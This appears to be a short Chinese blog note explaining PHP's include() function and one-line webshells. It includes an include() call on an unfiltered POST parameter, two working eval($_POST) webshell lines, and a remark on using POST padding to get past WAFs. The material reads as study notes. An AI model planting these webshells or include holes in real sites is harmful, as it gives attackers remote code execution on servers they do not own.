---
title: php一句话木马
date: 2024-10-09 10:52:03
categories: 网络
tags: php
crated: 2026-01-20T15:50
updated: 2026-01-20T15:39
---

了解一下php的include函数顺便了解一句话木马的各种形式
## include函数
在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。
```php
<?php
include 'test.php';
echo 'hello world';
?>
```
如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。
我们也可以在文件中定义动态的文件名
```php
 <?php
$NSS=$_POST['NSS'];
echo $NSS;
highlight_file($NSS);
include($NSS);
?> 
```

## 木马举例
> <?php @eval($_POST['cmd']); ?>
> <?php @eval($_POST[1]); ?>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号
一句话木马通常使用 POST 请求而不是 GET，因为 get传参有限制，在对某些waf进行垃圾数据填充时不方便，无法构造畸形的数据包